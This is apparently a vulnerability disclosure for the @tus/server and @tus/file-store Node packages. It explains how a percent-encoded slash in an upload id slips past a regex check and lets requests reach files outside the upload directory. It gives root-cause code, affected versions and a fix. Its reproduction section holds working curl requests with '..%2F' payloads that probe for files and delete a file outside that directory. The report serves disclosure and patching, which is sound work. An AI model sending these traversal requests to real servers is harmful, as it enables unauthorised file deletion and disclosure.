## Summary

`@tus/server` derives the upload id from the request URL with a regex intended to confine it to a single path segment, then applies `decodeURIComponent` to the matched value. The regex runs against the raw (still percent-encoded) URL, so an encoded path separator (`%2F`) passes the regex and is decoded into a real `/` afterwards. The id then reaches the data store and file store with no containment check, and `path.resolve`/`path.join` resolve it outside the configured upload directory. The result is a network-reachable path traversal with no authentication enforced by the library.

## Root cause

`packages/server/src/handlers/BaseHandler.ts`:

```ts
const reExtractFileID = /([^/]+)\/?$/

getFileIdFromRequest(req: Request) {
  const match = reExtractFileID.exec(req.url as string)
  if (!match || this.options.path.includes(match[1])) {
    return
  }
  return decodeURIComponent(match[1])   // decoded AFTER the segment regex
}
```

`req.url` is the raw request target; Node does not decode `%2F`, so `reExtractFileID` sees no literal slash and matches the whole encoded segment. `decodeURIComponent` then turns `%2F` into `/`.

The returned id flows, unsanitized, into:

- `@tus/utils` `FileKvStore.resolve`: `path.resolve(this.directory, `${key}.json`)` (get/set/delete of upload metadata).
- `@tus/file-store` `create`/`read`/`write`/`remove`: `path.join(this.directory, file_id)` and ```fs.unlink(`${this.directory}/${file_id}`)```.

`path.resolve`/`path.join` collapse `..`, so the operation escapes `this.directory`.

## Impact (default Server + FileStore, no `getFileIdFromRequest` override)

An attacker who can reach the endpoint can:

- **Read `.json` files outside the upload directory, in a limited way.** A 410-vs-404 side channel reveals whether a given `.json` path exists and parses as JSON. When a same-name non-`.json` file also exists, the parsed `size` / `metadata` / `creation_date` fields are reflected in HEAD response headers.
- **Delete arbitrary files outside the upload directory via DELETE.** The default code path calls `FileStore.remove` -> `fs.unlink` on the traversed path, with no prior lookup gate.
- **Modify/append to arbitrary files via PATCH, and stream arbitrary file contents via GET**, when a suitable `.json` "twin" exists at the target path. GET additionally requires its `size` to match the target file. Under the default `namingFunction` (`crypto.randomBytes`, which ignores request input), the attacker cannot create this twin.

The library does not enforce authentication. `onIncomingRequest` runs for every affected method and can enforce per-ID authorization; deployments that only authenticate the caller remain affected.

## Affected versions

- `@tus/server`: `1.0.0-beta.5` through `2.4.2` (all stable 1.x and 2.x releases).
- `@tus/file-store`: all tagged versions through `2.1.0` lack path containment.

## Reproduction

Default-config server (no auth):

```ts
import { Server } from '@tus/server'
import { FileStore } from '@tus/file-store'
new Server({ path: '/files', datastore: new FileStore({ directory: '/tmp/up' }) }).listen(7777)
```

Existence oracle (410 = path exists and parses; 404 = absent):

```
echo '{}' > /tmp/proof.json                       # victim file OUTSIDE /tmp/up
curl --path-as-is -i localhost:7777/files/..%2Fproof              # -> 410  (reads /tmp/proof.json)
curl --path-as-is -i localhost:7777/files/..%2Fdoes-not-exist     # -> 404
curl --path-as-is -i localhost:7777/files/..%2F..%2Fproof         # -> 404  (one level too deep -> /proof.json)
```

Arbitrary file deletion outside the upload directory:

```
echo hi > /tmp/victim; echo '{}' > /tmp/victim.json
curl --path-as-is -X DELETE -H 'Tus-Resumable: 1.0.0' localhost:7777/files/..%2Fvictim
# -> 204; /tmp/victim and /tmp/victim.json are removed
```

All of the above was verified end to end (1.10.2 and current `main`/2.4.2), including arbitrary write/append via PATCH and full-file read via GET when a `.json` twin is present.

## Suggested fix

Validate the id after decoding and reject any path separator, `..`, or NULL before it reaches the stores, e.g. in `getFileIdFromRequest`:

```ts
const id = decodeURIComponent(match[1])
if (/[\\/]|\.\.|\x00/.test(id)) return   // or throw
return id
```

As defense in depth, `FileKvStore.resolve` and `FileStore` path construction should additionally verify that the resolved path remains within `this.directory`.

## Credits

I would like to request a CVE for this bug, the credit name is: Malik (m411k) of Leet Solutions
